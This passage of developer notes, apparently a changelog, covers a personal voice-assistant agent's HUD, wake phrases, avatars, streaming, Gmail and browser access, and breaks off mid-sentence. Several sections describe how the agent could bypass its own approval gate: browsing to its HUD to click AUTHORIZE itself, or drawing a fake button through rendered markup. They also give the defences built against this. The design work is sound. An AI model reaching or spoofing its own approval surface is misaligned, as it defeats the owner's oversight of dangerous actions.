**The window is now the owner's real Windows Chrome/Edge in app mode**
(`find_browser()` — WSL launches the Windows exe, Windows reaches the WSL
server via automatic localhost forwarding; `JARVIS_FACE_BROWSER` overrides).
No Chrome-for-Testing banner, native frame, and audio runs on the Windows
stack (the WSLg pulse path only matters for the CfT fallback now). The mic
grant lives in the user's real browser profile. Quirk: an already-running
Windows browser delegates the app window and the launcher's child exits
immediately — `main()` detects that and keeps serving (Ctrl-C to stop).

Phase 4 shipped (2026-07-31): **streamed TTS** — `/converse` now returns
NDJSON written progressively (meta line → one audio line per sentence via
`_sentences()` → done line); the HUD schedules chunks back-to-back on the
audio clock. First audio lands ~1s after the agent finishes instead of after
the whole reply synthesizes (measured: 2.8s to first speech on a 1-step
turn). **Barge-in** — pressing PTT while he speaks stops all scheduled
sources and aborts the fetch (server sees a broken pipe mid-stream — normal,
swallowed). Client aborts cannot cancel a running `run_turn`, so barge-in is
only honored in the speaking state, never mid-think. **Wake word** — Chrome's
built-in SpeechRecognition (webkitSpeechRecognition, zero dependencies,
audio goes to Google's speech service — owner OK with that) runs
continuously when armed via the WAKE WORD row in the SYSTEMS panel
(persisted in localStorage); hearing a wake phrase chimes and starts a
recording that self-stops on ~1.4s of silence. Saying one while he speaks
barges in. `talk.html` was retired — it spoke the old single-JSON
`/converse` shape.

**Wake phrases.** The default answers to **"jarvis"** and nothing else; every
other phrase belongs to an avatar and arrives over `/config` as regex source
(**"big yahu" is the `bibi` avatar's**, moved off the default 2026-08-06 —
see *Avatars* below). The built-in lives in `WAKE_PATTERNS` in `jarvis.html`
(duplicated from `avatars.DEFAULT`, and the fallback if `/config` never
answers); `matchesWake()` is what `recog.onresult` calls. Two rules for any
new phrase, wherever it is written. It is matched against a *live interim*
transcript of a phrase the recognizer has never heard, so it has to tolerate
the spellings Chrome guesses ("big ya hoo", "big yoohoo", "big yahu", "big
yawho" all resolve to the same intent) — a literal string match would miss
most real utterances. And **every pattern is `\b`-anchored at both ends**,
because a wake hit cancels the turn in flight and starts recording: an
unanchored pattern fires on a substring of ordinary conversation and takes
the owner's words mid-sentence. `tests/face/hud_wake_check.py` is the free
suite (the built-in firing, 11 utterances that must stay silent — "yahoo
finance", "big yacht", "jarvisson" — the bibi phrasings being silence on the
default and firing once that avatar is applied, and the armed hint naming
whatever is live, since an undiscoverable wake word is one nobody says). Run
it after touching the patterns.

**A wake phrase belongs to exactly one avatar.** Leaving "big yahoo" on the
default *and* giving it to `bibi` would mean the owner cannot tell which one
they just summoned — the window and the prompt would disagree about who
answered. Both `avatars_check` and `hud_wake_check` assert the default no
longer fires on it.

`bibi` wakes on **"big yahu"**, **"netanyahu"** (whole — "benjamin
netanyahu" — or on its own) and **"bibi"**. Two things decided while adding
the name, both instances of the anchoring rule rather than new ones:
**bare "benjamin" is deliberately not a phrase**, because it is a common
name and a wake hit takes the owner's words mid-sentence, and the name's
regex tolerates what the recognizer actually returns ("netan yahoo",
"nathan yahoo", "netanyaho", "netanya who") while staying clear of
"nathan is on the call" and "netanya beach". The near-misses are in
`hud_wake_check`'s QUIET list, which is the half of that suite that matters.

**Avatars shipped (2026-08-06).** Who he presents as is now data, not
hard-coded: an avatar is `avatars/<slug>/avatar.svg` + `avatar.json`
(`{name, wake, voice, rings, accent, banner, label, description}`), and switching
one changes four things at once — the **name** (an identity rename applied to
`config.SYSTEM_PROMPT` in `Agent._refresh_system`, so it reaches every
surface at once and survives compaction), the **wake phrases**, the **face**
drawn where the triangle emblem was, and the **voice** he answers in. `avatars/` is gitignored, so
`jarvis avatar new <slug> --template fox|owl|bust|reactor|bibi` scaffolds one
from art checked into `avatar_templates.py` (`bibi` is the one template that
is a specific face rather than an archetype — it is checked in *because*
`avatars/` is not, so a reclone still has somewhere for "big yahu" to live;
a template carries art only, so the phrase itself goes in the scaffolded
`avatar.json`). Controls: `jarvis avatar` to
list, `jarvis avatar <slug>` to switch persistently, `jarvis face -a <slug>`
to run one window as an avatar without touching the saved choice, the AVATAR
row in the HUD's SYSTEMS panel, and the `set_avatar` / `avatar_list` tools
("Jarvis, become the fox"). All of them land on `avatars.set_active`, which
broadcasts SSE `avatar` so every open window relabels live.

**A window boots as the default (2026-08-12, owner's call).** `jarvis face`
with no `-a` and no `JARVIS_AVATAR` is now exactly `jarvis face -a jarvis`:
`cmd_face` calls `avatars.pin_for_window()`, which pins the built-in for the
process instead of reading the saved pointer. The reason is that the pointer
is writable *by Jarvis himself* — `set_avatar` persists, so one "become the
fox" renamed the desk window for every launch afterwards, and the owner would
have to know which command undid it. An avatar now lasts as long as the window
that chose it. Three things deliberately unchanged: it is a **pin**, so
`set_active` clears it and switching in the HUD works and persists as before
(it just no longer decides how the *next* window boots); an explicit
`JARVIS_AVATAR` in the environment is still honoured, because it is a
deliberate pin and not a leftover; and every other surface — `jarvis chat`,
the daemon, Discord — still reads the saved slug, so this is a statement about
the desk window, not about who he is. An unknown `-a` slug refuses to start
rather than falling back to the default: booting as somebody the owner did not
ask for is worse than not booting. Covered in `tests/avatars_check.py`.

**An avatar can change the orb's outer ring (2026-08-06).** `"rings"` in
`avatar.json` picks a set from `RING_SETS` in `jarvis.html`; `"triangles"`
(bibi's) replaces the outermost 144-tick ring with **two interlocking
equilateral triangles turning as one figure** — the ring drawer gained a
`poly`/`copies` shape alongside `ticks` and `arcs`, so a new figure is a data
entry, not new drawing code. Only the outer ring is swappable; the four inner
rings are shared (`INNER_RINGS`) so a variant cannot quietly restyle the
whole orb. **An unknown name falls back to the default set** — the orb *is*
the push-to-talk button, so an avatar that could blank it would take the
surface's main control with it, and `hud_avatar_check` pins that.

**An avatar has a voice too (2026-08-06).** `avatar.json` takes `voice` (a
name from `voice.catalog()` — a Kokoro bundle voice, of which
`voice.available_voices()` lists the 54 already local, or since 2026-08-20 a
`pocket:` name — see *Pocket TTS* below) and an optional `speed`. Resolution lives in **`voice.tts()`**,
not the call sites — the same rule as `speakable()`, because three surfaces
synthesize speech (face, `/say`, Discord voice notes) and a fourth will. It
reads the active avatar per call, so a switch moves the voice on the next
sentence with no restart. Current: Jarvis `bm_george`, bibi `am_michael`,
hoot `bf_emma`, vex `am_puck`; `jarvis avatar` lists what each will *actually*
speak in, which is not always what its file asks for. Four notes:

- **The degradation rule is "leave him audible."** A voice that is not
  installed falls back to `config.TTS_VOICE` with a **once-per-process**
  warning (the face synthesizes a chunk at a time, so per-sentence would
  scroll), an unparseable `speed` falls back without losing the voice, and a
  vanished slug still speaks. Same shape as the wake-regex degradations.
- **The clamp is the last word, not the avatar.** `speed` still passes
  through the 0.5–1.3 clamp, because above ~1.3 the cloud provider silently
  truncates its own audio — an avatar must not be able to cut itself off.
- **Validation is what makes the cloud fallback safe.** The name is checked
  against the local bundle for the same model both paths run, so a
  local→cloud fallback cannot send a voice name the provider will reject.
  With no bundle installed, `available_voices()` is empty and every avatar
  speaks in the configured default — never an error.
- **The language heuristic was quietly wrong** and is fixed in the same
  change: `_local_tts` derived language from the voice prefix as `"en-gb" if
  voice.startswith("b") else "en-us"`, which was right for the two English
  families and made the other thirty voices (`jf_`, `zm_`, `ff_`, …) read as
  American English. `voice._LANGS` maps all nine prefixes now.

Four things worth keeping from building it:

- **The default has to be byte-identical to no-avatar.** `avatars.DEFAULT` is
  a built-in with the two existing wake regexes, and `jarvis.html` keeps its
  own hard-coded copy as the fallback for a `/config` that never answers —
  losing the wake word to a config hiccup is worse than a stale name. A test
  asserts the two copies have not drifted, because there is now a Python and
  a JS spelling of the same rule.
- **Every degradation path has to leave him summonable.** A missing slug, an
  avatar with no stated phrase, a regex that will not compile, an SVG that
  will not parse: each falls back rather than raising, because the failure
  mode of getting this wrong is a HUD that cannot be spoken to.
- **The rename is case-sensitive**, because the prompt also names shell
  commands (`jarvis chat -c`) and renaming those sends the owner to a command
  that does not exist. Only capital-J `Jarvis` moves.
- **An explicit switch beats the `-a` pin.** Without that, the picker would
  save the new avatar and redraw the window while the server went on serving
  the pinned one — the window and the server disagreeing about who he is,
  which is the same class of bug as the invisible step budget.

Also fixed on the way: the right-hand HUD column is a **flex stack** now
(`#rail`), not two absolutely-positioned panels. The AVATAR row pushed
SYSTEMS past OPERATIONS' hard-coded `top: 388px` and OPERATIONS silently
covered the SESSION row — a click-through bug that only `hud_session_check`
caught. And `tests/longhorizon_check.py`'s concurrency check was flaky
(~40%) for an unrelated reason: `_run` monkeypatches the module-global
`llm.chat`, so two threads each installing their own closure raced and the
loser's agent ran the winner's script. One shared script dispatching on the
calling agent's own user message fixes it.

**Phase 5 shipped the approval gate (2026-07-31)** — the face is no longer
read-only. `jarvis/face/approvals.py` turns a dangerous tool call into a card
in the HUD: `dispatch()` calls the approver synchronously, so `request()`
**blocks the agent thread** while the pending decision goes out over SSE, the
window POSTs `/approve`, and the blocked thread wakes with the answer. This
only works because the face is a `ThreadingHTTPServer` — the deciding request
must run on a different thread than the one it unblocks. Every failure mode
denies: no window connected (asked and answered before anything is
broadcast), 120s timeout, window closed mid-question, shutdown. Request ids
are one-shot 72-bit tokens, so an answer cannot be replayed or applied to a
later card than the one the owner read. `/approve` is same-origin only,
compared against the request's own `Host` (not a hard-coded 8402, so a server
on another port still approves). In the HUD, deny is the cheap action
(Escape, or the button) and authorize takes a deliberate click — nothing is
keyboard-defaulted, and PTT/wake are inert while a card is up. Card contents
are built with `textContent`; the args are model-written strings and the HUD
is trusted UI, so never `innerHTML` there. When a card appears, the HUD also plays a short two-tone Web Audio chime so an owner who is not watching the window notices the prompt; the chime is best-effort because browsers may block audio before user interaction.

**The gate is only real if Jarvis cannot reach it.** He has browser tools and
the allowlist is `localhost` — so he could have opened his own HUD and
clicked his own AUTHORIZE button. `config.is_face_origin()` now makes
`BrowserPolicy.allows()` and `fetch_page()` refuse the face's origin ahead of
every other check, *including* `allowed_hosts=['*']`. It matches all of
loopback, `*.localhost` included, because Chrome resolves `foo.localhost` to
127.0.0.1. Remaining honest gap: any local process running as the owner can
read the SSE stream and POST an approval — but that process could just run
the command itself, so the boundary is unchanged.

**Turn state display rebuilt (2026-07-31).** The window used to show three
things — PROCESSING, RUNNING · TOOL, RESPONDING — and got both ends wrong: it
sat on the last tool's label through the model call *and* through TTS, so the
slowest, most opaque seconds of a turn read as "still running gmail_search".
Two channels now carry it:

- **Phases on the `/converse` stream**, emitted as each stage actually
  starts: `transcribing -> heard -> thinking -> meta -> composing -> audio*`.
  Headers go out before STT so the window can show SENDING immediately; STT
  failures are now an in-stream `error` line rather than a 500. `heard`
  arrives on its own line, so your words hit the log mid-turn instead of
  after the reply.
- **Tool lifecycle on SSE**: `tool_done` was the missing half. The window
  tracks a running count and falls back to THINKING when it hits zero, and
  the OPERATIONS feed marks each op running/done with its duration.

Why phases go on the turn stream and tools stay on SSE: phases must stay
ordered with `meta`/`audio`, and SSE is a *separate connection* with no
ordering guarantee against it. So the window only lets a tool event set state
while it is in the thinking phase — a late tool event is still logged but
cannot rewind a later phase. There is a free test for exactly that race.

Also: an elapsed clock ticks in the status through every waiting state and
stops when he speaks (a turn that is alive vs one that is wedged is now
visible), `agent.py` emits **`interim_text`** for what the model says on its
way to a tool call — distinct from the final `text` event, and shown as a
note in OPERATIONS — and `init()` may no longer clobber the status: async
getUserMedia can resolve after a turn has started, so boot only writes the
status if nothing else has.

**A turn is interruptible mid-thought (2026-07-31).** Showing the transcript
at STT is only half of it — the owner's reason for wanting it was catching a
misheard line, which needs a way to take the turn back. Barge-in used to work
only while Jarvis was *speaking* (`S.busy` blocked `startRec` for the whole
agent run), which is precisely the wrong window. Now push-to-talk and the wake
word both cancel a turn in flight: the window aborts the stream, POSTs
`/cancel` (same-origin, like `/approve`), and starts recording immediately.

`Agent` takes a `should_stop` callable and **checks it between steps and
nowhere else.** That is invariant 3, not fussiness: bailing out inside the
tool loop would leave an assistant message whose `tool_call` ids never get
their results, and the next request 400s. Between steps the transcript is
always whole, so the cancelled conversation is immediately reusable — the
correction is just the next user message. The face clears its cancel Event
under `_agent_lock` right before `run_turn`, so a cancel aimed at the previous
turn cannot kill the replacement. A cancelled turn returns no reply and
synthesizes no speech.

**Since 2026-08-10 that is no longer worst-case latency.** Completions stream
(`config.STREAM`, on by default), and `should_stop` is checked per SSE line, so
a cancel lands *during* generation instead of after it. This is safe precisely
where it happens: nothing has been dispatched at that point, so no `tool_call`
is outstanding and the assistant turn is simply never appended — the transcript
stays whole, which is all invariant 3 asks. `llm.Cancelled` is the signal.

Two properties keep streaming honest. A failure **before** the first token is
retried, and a failure **after** one is not — once bytes have reached a surface,
replaying the call would duplicate what the owner already saw. And if streaming
never starts at all (a provider that cannot), `chat()` falls back to the
non-streaming path once: degrade to a slower answer, never to no answer.

`on_delta` also carries the text out as it arrives, surfaced as an `on_event`
**`delta`**. Nothing renders it yet — the HUD still shows the reply when the
turn completes — so progressive display in `jarvis.html` is the obvious next
step, and it needs no server work.

**Step budget, and admitting when it runs out (2026-08-02).** `Agent`'s
default `max_steps` is **30** (was 12). Only the conversation surfaces take
the default — the HUD/voice agent and `jarvis chat`/`ask` both construct
`Agent` without the argument; designer (24), workflows (20) and every bench
set their own. 12 was too tight for real work: a self-improve turn spends most
of it on checkpoint + edit + test runs before any misstep, and the observed
failure was a completed, committed UI change reported to the owner as a bare
`[stopped after 12 steps without finishing]`.

The bug underneath it is the one worth remembering: **exhausting the budget
used to be invisible to the model.** Every other exit path appends its
assistant message inside the loop, but the `stopped_early` tail set only
`turn.text` — so the transcript ended on a pile of tool results with no sign
of the cut, and the *next* turn's model had nothing to explain itself with.
Asked why he had stopped, Jarvis confidently answered "there isn't a
twelve-step limit" while the window showed exactly that message: not a lie, a
confabulation from a transcript that never mentioned the truncation. The
notice is now appended to `self.messages` before returning (safe — the loop
only exits at a step boundary, so invariant 3 holds). Generalizes: **any state
the surface shows the owner but never writes into the transcript is state the
model will invent a story about.** Covered by `tests/face/cancel_check.py`,
which owns both no-reply exit paths now.

**Hitting the wall is survivable now (2026-08-12), and the number is the least
of it.** The owner hit `[stopped after 30 steps without finishing]` again, on
`jarvis chat` — the face had already been raised to 60 in 2026-08-06 for the
same reason, which is the tell that raising one number was never the fix.
Three changes, in increasing order of what they buy:

- **One budget, `config.MAX_STEPS` (env `JARVIS_MAX_STEPS`), default 60.**
  Every conversation surface — chat/ask, the HUD, Discord, goal slices — takes
  the `Agent` default, and `FACE_MAX_STEPS` now defaults to it rather than
  carrying its own 60. The cap is a runaway guard, not a work limit: a step is
  one cheap call, and the real ceilings are the goal runner's dollars and an
  owner who can cancel.
- **The model can see the budget before it hits it** (`Agent._budget_note`).
  Only the last fifth (never fewer than the last three steps) is announced,
  and it rides the working-context block — rewritten every step, so it never
  accumulates in the transcript and costs nothing on the other 80% of a run.
  This is the confabulation lesson applied one step earlier: a run that knows
  it has three steps left stops opening new threads and writes down where it
  got to; a run that does not know simply stops mid-stride.
- **The wall produces a handoff, not a bin** (`Agent._handoff`). Exhaustion
  spends one more call with **`tools=None`** — the point, because a plain
  "keep going" nudge invites the model to spend it asking for a 61st step —
  for DONE / OPEN / NEXT, and that text follows the notice into `turn.text`
  and the transcript. The next message resumes from it. Every failure path
  degrades to the bare notice: a handoff is a bonus and must never be why a
  turn raises, so a provider error, a cancel at the wall, or an empty reply
  all fall back. The `text` event now fires on this path too — before it,
  `jarvis chat` printed **nothing at all** for a turn that ran out, because
  the CLI renders on that event only.

Covered in `tests/face/cancel_check.py` (handoff content and tool-free call,
the degraded path, the announcement window, and the shared default).

**Gmail shipped (2026-07-31)** — the first real integration, and the
template for the rest: `jarvis auth google <client.json>` runs the one-time
OAuth consent (PKCE + state, loopback redirect, human-only CLI command),
writes the scoped refresh token to `~/.config/jarvis/google_token.json`
(600), and `tools/gmail.py` exposes `gmail_search` / `gmail_read` /
`gmail_send` — send is `dangerous=True`, so it hits the CLI y/N or the HUD
authorization card. `google_auth.access_token()` refreshes behind a cache;
tools retry once on 401. Token bundle covered by all three secrets layers
(name, glob, scrub — see Safety design). Free synthetic suite:
`tests/gmail_check.py`. Setup steps live in `jarvis auth google` (no
argument). Google-side gotchas: the OAuth app must be **published to
production** or refresh tokens die after 7 days; a re-consent needs the old
grant revoked at myaccount.google.com/permissions or Google returns no new
refresh token. Validated end-to-end by the owner 2026-07-31: a gated send
(draft → CLI y/N showing exact to/subject/body → delivered) and a 7-day
inbox summarization (parallel gmail_reads, $0.0017). Note that mailbox
content now flows through the orchestrator tier, so the model routing
policy applies to it.

**Internet access opened (2026-07-31).** `web_search`/`fetch_page` were
already unrestricted; the browser was the localhost-only piece. The default
allowlist is now `["localhost", "127.0.0.1", "*"]` where `'*'` means the
*public* internet: `config.is_lan_host()` refuses private/CGNAT/link-local
space and unresolvable names, judged by what a hostname resolves to (so
`lvh.me` → 127.0.0.1 is not a route to local services or the face). Enforced
on the requested URL and re-checked after goto/click/submit
(`_guard_landing()`); `fetch_page` gained the same LAN block plus a
post-redirect check — it had been wide open to the LAN. System prompt gained
open-web conduct rules (no credentials or personal data into pages, no
outward-facing submissions unless asked). Verified live (example.com loads
and snapshots; 192.168.1.1 refused with a clear message) and synthetically
(`tests/browser/policy_check.py`); approval + secrets suites still pass.

**Browser moved to its own thread (2026-07-31).** The first real internet use
in `jarvis chat` crashed the REPL after the turn: Playwright's sync API parks
a running asyncio loop on the thread that starts it, and prompt_toolkit
refuses to prompt on a thread with a live loop ("asyncio.run() cannot be
called from a running event loop"). Fix is invariant 7: a dedicated
`jarvis-browser` thread owns all Playwright work, which also makes browser
tools safe from the face's per-request handler threads (they would otherwise
break on the second voice turn that browsed). External page access goes
through `Session.eval_js()` now; chat/ask/face stop the session on exit.
Verified by `tests/browser/thread_check.py` and a live pty'd chat run
(browse example.com → answer → prompt again → clean exit, no EPIPE).

**Design board shipped (2026-07-31).** `whiteboard.html` on the face server:
paper canvas (pen, straight line, rect, ellipse — Shift constrains to 45°,
square, circle — text, eraser, undo; ops-list model, WYSIWYG PNG export),
prompt bar with an ATTACH SKETCH toggle, live tool ticker, and a preview
panel. POST `/design` runs a separate persistent designer Agent
(`DESIGNER_SYSTEM`, files+browser+web tools, max_steps 24, vision via the new
`run_turn(images=…)` — owner-supplied PNGs ride the user message; context
eviction handles them like any image). Output files are found by mtime diff
under `designs/` and served by the **workshop server on port 8403** — a
separate origin so agent-written pages can never reach `/approve`, and
browsable by Jarvis so he can screenshot his own work to self-check. Open it
with `jarvis face whiteboard.html`, or browse localhost:8402/whiteboard.html
while the face runs. Smoke-validated (see Testing): sketch annotations
override drawing colors, as prompted. First real-owner run caught a bug the
smoke could not: **paths in agent prompts must be absolute** — the prompt
said `designs/…`, `write_file` resolves against $CWD, and the owner launches
`jarvis face` from `~`, so output landed in `~/designs` while the workshop
served the repo's. (The smoke passed because tests run from the repo root —
a CWD-dependent bug needs a CWD-varied test, or no CWD dependence at all.)
The prompt now carries `config.DESIGNS_DIR` verbatim plus the exact preview
URL root; `whiteboard_check.py` asserts both. Known niggle: the whiteboard's SSE
subscription counts as a "viewer" for the approval broker but the page has
no card UI — moot today (designer tools are all safe), fix if the designer
ever gains a dangerous tool.

**Skills, workflows, permission modes, mute (2026-07-31).** Skills follow the
memory pattern — `skills/<name>.md` (frontmatter description + instructions),
pulled on demand via skill_list/skill_read, recordable via skill_write, four
starters checked in (email-triage, morning-briefing, skill-creator — the
meta-skill that interviews the owner and drafts trigger descriptions — and
whiteboard, which opens the board via `run_command jarvis face
whiteboard.html` since the face origin is refused to his own browser, and
closes it via `whiteboard_close`). **Window close is opt-in by page**
(`tools/whiteboardctl.py`, voicectl pattern): the tool broadcasts SSE
`wb_close`; whiteboard.html calls `window.close()` (app-mode windows have a
single history entry, so it is honored — with a blank-page fallback), and
jarvis.html deliberately ignores the event: the HUD is the approval
surface, and the agent must not hold a lever that closes the window gating
him. `whiteboard_check.py` asserts both sides. **Two-tier index
(Claude Code's design): `skills.index()` — every skill's name + trigger
description — is rebuilt into `messages[0]` at the top of each `run_turn`,
but only for agents whose toolset includes `skill_read`** (designer/benches
never see references to tools they lack). Bodies still load only via
skill_read. Descriptions are written as triggers ("Use when the owner …");
the index is cached on (mtime_ns, size) per file — mtime alone misses
quick same-tick rewrites — and skill_write busts it directly. Capped at 30
skills / 2k chars with a skill_list pointer. Rewriting messages[0] is
invariant-safe: pruning/compaction never touch it. Workflows: workflow_start/status/log run a task
on a background agent with safe tools and a deny-all approver (see Safety
design); in-memory registry, restart forgets them. Permissions: see Safety
design — ask (default) / persistent allowlist ('a' in CLI, ALWAYS card
button in the HUD, `approved-always` in the decision log) /
`--dangerously-skip-permissions` (process-only). Mute: MUTE row in the HUD
SYSTEMS panel, `set_voice_mute` tool for "jarvis, mute yourself", one SSE
broadcast keeps them in sync; muted turns skip TTS synthesis entirely (text
still renders). HUD SYSTEMS also shows PERMISSIONS state (SKIP ⚠ in red
under the flag).

**Typed input + attachments in the HUD (2026-07-31).** An input bar at the
bottom of jarvis.html: type + Enter sends a text turn (same cut-off rules
as push-to-talk — barge-in while speaking, cancel while thinking, inert
while an authorization card is up); files stage as removable chips via the
picker, drag-drop, or paste; `@path` in the text attaches server-side
files. The staging contract: whatever is staged when a turn goes out —
typed *or spoken* — rides that turn, so you can stage context and just
start talking. `/converse` now also takes an application/json envelope
`{audio_b64?, audio_mime?, text?, attachments: [{name, mime, data_b64}]}`
(the legacy raw-webm body still works); `_assemble_turn` folds it all into
one user message — images become multimodal parts via `run_turn(images=…)`,
which now accepts `{b64, mime}` dicts alongside plain PNG strings, and text
files inline as fenced blocks. Limits: 8 files/turn, 4MB/file, 100k chars
inlined — every refusal becomes a bracketed note in the message, never a
silent drop. Secrets rules carry over: protected credential files are
refused at @path by name, and inlined text is scrubbed. Typing Space must
not trigger push-to-talk — the input stops propagation, and
hud_input_check pins that. Typed words hit the COMMS log at send time;
`meta.heard` is non-empty for typed turns so the client's no-signal path
stays voice-only.

**Voice latency work (2026-07-31).** The owner heard a multi-second gap
between reply text appearing and speech starting. Root cause: `llm.py` used
bare `httpx.post`, so *every* OpenRouter call — each agent step, STT, and
each TTS sentence — opened a fresh TCP+TLS connection. Measured: cold TTS
call 3013ms vs 377-685ms through a keep-alive pool. Three fixes: (1) one
module-level `httpx.Client` shared by chat/speech/transcribe — the chat call
that produced the reply now leaves a warm connection for the TTS that speaks
it; (2) `_sentences()` clamps the first chunk to ≤90 chars at a clause
boundary (synthesis time scales with length; 196→83 chars measured 1217→
491ms) — `tests/face/sentences_check.py` guards clamping + lossless rejoin;
(3) TTS chunks synthesize two-in-flight via a ThreadPoolExecutor and stream
in order, with cancel_futures on barge-in so abandoned speech stops costing
money. **And (4), the one that actually mattered when the gap persisted:
provider routing.** Kokoro is served by DeepInfra and Together; OpenRouter's
default route (DeepInfra) was serving identical requests in 2.8-23.7s while
Together served them in 0.5-1.8s. `config.TTS_PROVIDER` (default Together)
now sets a routing preference in `llm.speech()`, fallbacks allowed. Wired
path verified: 5 consecutive turns at 451-583ms. Same lesson as the bench
finding: **the model is not the product — the provider serving it is.**
Re-probe per provider (payload `{"provider": {"order": [...],
"allow_fallbacks": false}}`) before blaming the model or the code.
**Epilogue: the stalls persisted intermittently on both providers via
OpenRouter while the owner measured both providers fast directly and
`tests/net_probe.py` showed the local network clean — so the tail lived in
OpenRouter's audio proxy path, and TTS went local (2026-07-31): kokoro-onnx
on CPU, same model, same bm_george voice, measured 308-351ms per sentence,
flat.** `voice.tts()` branches on `config.TTS_BACKEND` ("local" default,
falls back to cloud with a one-time warning if deps/models missing); local
emits WAV, cloud MP3 — consumers sniff (`RIFF`), never trust a label. Model
files: ~/.cache/jarvis-tts/{kokoro-v1.0.onnx,voices-v1.0.bin} (github
thewh1teagle/kokoro-onnx releases, ~340MB); dep via `uv pip install -e
.[voice]`. The face pre-warms the model at startup (~3s ONNX load, off the
critical path). `tests/voice_local_check.py` is the free suite — synthesis
shape and speed, the cloud fallback, and (2026-08-06) **which** voice speaks:
the avatar's, its every degradation path, and the voice→language map. It
pins `AVATAR_ENV` to the default first, because otherwise the owner's saved
avatar decides what the suite asserts. STT remains cloud (parakeet); local
whisper stays the next swap if it ever needs to be.

**Markdown: rendered in the HUD, stripped for speech (2026-08-03).** The
model writes markdown and both surfaces were taking it literally — the COMMS
log printed `**Done.**` as source, and TTS read the asterisks aloud.

- **The HUD renders it** (`renderMarkdown` in `jarvis.html`): headings,
  lists (one level of nesting), fenced code, blockquotes, tables, rules,
  inline code/emphasis/strike/links. Hand-rolled into **DOM nodes, never
  `innerHTML`** — same rule as the authorization card, and it matters more
  here: a reply that could inject markup into the window that gates approvals
  could draw its own AUTHORIZE button. Link hrefs are scheme-checked
  (http/https/mailto only, `target=_blank` so the HUD itself never
  navigates); anything else renders as plain text. Only *his* messages are
  rendered — the owner's own line goes up verbatim, because typing `*foo*`
  means `*foo*`.
- **TTS strips it** (`voice.speakable()`), and the strip lives inside
  `voice.tts()` so no speech path — face, Discord voice notes, `/say` — can
  forget it. Code fences are dropped whole rather than read aloud; a reply
  that was *only* a fence yields `""`, which the face treats as text-only.
  The face also strips before `_sentences()`, because the first-chunk clamp
  measures length and counting asterisks cuts speech in the wrong place —
  and `_sentences()` now splits on newlines too, so a de-bulleted list gets
  a pause per item instead of synthesizing as one long chunk.

Not done: `whiteboard.html`'s reply panel still shows raw text. Sharing the
renderer means lifting it out of `jarvis.html` into a static JS file both
pages load.

**Voice round 2 (2026-08-18) — the mic stops being a button.** Three owner
complaints, one architecture: *"I have to wake jarvis each time by saying his
name"*, *"sometimes the recording gets cut"*, and *"somebody is talking in the
background and it just doesn't send"*. All three were the same design fault —
the microphone opened when a turn started and closed when it ended, so every
question about *when speech begins and ends* had to be answered before the
audio existed.

**The mic is now open from boot and never closes.** Audio flows continuously
into a 40-second ring buffer at 16kHz (parakeet's own rate, so resampling in
the browser costs nothing and shrinks the upload); utterances are carved out
of the ring *afterwards* by a detector, and the payload is a WAV the HUD
builds itself rather than a webm the MediaRecorder owns. Everything is
measured in **samples, not wall-clock milliseconds** — the audio thread is the
only clock that cannot drift against the buffer actually being sent.

What each complaint turned out to be:

- **The first word was missing on every wake-word turn.** Chrome's recognizer
  reports a phrase several hundred ms after it was said, and `onWake` called
  `startRec()` at *that* moment — so recording began somewhere inside "what's
  the weather". Nothing starts recording now; a wake hit only decides where to
  cut, and back-dates the start past the lag. Measured in
  `hud_capture_check.py`: 1.4s spoken uploads as 2.9s, and the difference is
  exactly what used to be lost. Push-to-talk gets the same pre-roll, so
  talking the instant you press no longer clips the first syllable.
- **A fixed threshold cannot be right twice.** The old detector compared a raw
  peak against a hard-coded `0.045` with a 1400ms hangover. On a quiet mic
  ordinary speech never cleared it, so a breath mid-sentence ended the turn;
  in a noisy room the level never fell *below* it, so the end of the utterance
  was never detected and the recording ran to its 15s cap. The floor is
  tracked from the room now — falling fast (0.2s) so a room going quiet is
  followed within a breath, rising slowly (8s) so background chatter has to be
  sustained to count, and **rising slower still while an utterance is open
  (25s), so the owner's own voice cannot walk the threshold up underneath
  itself and cut the sentence off.** Verified: 20s of background talk lifts the
  threshold 0.0200 → 0.0875 and leaves nothing wedged open, while speech at
  0.02 — which the old 0.045 could never see — opens an utterance in a quiet
  room.

  The time constants are **in seconds, not per frame**. They were per-frame
  first, which silently means a different amount of time on a different buffer
  size — and made the first test that fed one large frame measure something
  the microphone never does.
- **His name is not needed every time.** A follow-up window opens the moment he
  stops speaking (`doneSpeaking()`), so the next utterance is simply the next
  turn. This is free rather than new machinery: the mic was never closed, so
  there is nothing to reopen. The window is stated in the hint ("JUST SPEAK ·
  STILL LISTENING") — an affordance nobody knows about is one nobody uses —
  and expires on its own timer, because nothing else redraws while the HUD is
  idle and a lapsed promise is worse than none.

Four rules the design turns on, each of which was a bug first:

- **An utterance is only sent if it was addressed to him**: the orb was held, a
  wake phrase was heard around it, or it landed in the follow-up window.
  Everything else is captured and discarded. Continuous capture without that
  gate is a hot mic.
- **A wake phrase claims exactly one utterance.** Leaving the hit live for the
  rest of its grace window let the *next* thing said — an aside to someone
  else, a sentence finished after he had already started — arrive as a second
  turn nobody addressed to him. Found by a test that failed for what looked
  like a harness reason and was not.
- **He does not answer himself.** The detector is suppressed while he is
  speaking, thinking, or holding an authorization card. It still *tracks the
  room* through all of it, so the threshold is current the moment the
  follow-up window opens. Barge-in stays deliberate — orb, space, or his name
  — because an open mic that interrupts on any sound interrupts on the wrong
  ones.
- **The minimum length is measured on the speech, not the segment.** The
  segment is padded at both ends, so measuring *it* let a 90ms cough clear a
  350ms floor on padding alone. `VAD.voiced` counts only frames above the
  threshold. Relatedly, the hangover is trimmed off the end before upload —
  it is the silence that *proved* the utterance ended, and shipping it is a
  second of nothing for the transcriber.

**And the reply starts sooner (same day).** Two independent fixes, measured
against local Kokoro:

- **`_sentences()` was defeating its own purpose.** The rule that keeps a stray
  fragment from becoming its own chunk ("A tiny one.") also fired when the
  *previous* chunk was short — which is exactly the opener. So a perfect
  20-character first chunk was swallowed into a 98-character one, and the
  first-chunk clamp then hacked *that* apart at the last space, between "is"
  and "complete." **1633ms to first audio instead of 607ms, plus an audible
  break mid-phrase, on the one metric the function exists to optimize.** The
  two merge reasons are not symmetric and are now held apart in `_merges()`:
  a tiny *incoming* part is always glued back; a tiny *preceding* chunk
  absorbs what follows unless it is the opener. The clamp's no-clause fallback
  also backs off past a **binding word** (`_BINDING` — articles, auxiliaries,
  prepositions, determiners, degree adverbs), because a cut is permanent and
  audible while backing off a word costs nothing.
- **TTS now runs while the model is still writing** (`_Speculator`). The text
  has been streaming all along — it is what draws the HUD's live draft — so
  chunks are built as they appear and are waiting when `run_turn` returns.
  **Turn-end to first audio: 879ms → 188ms, 3 of 4 chunks pre-rendered.**

  The owner's call, and the safe one: **audio still goes out only after the
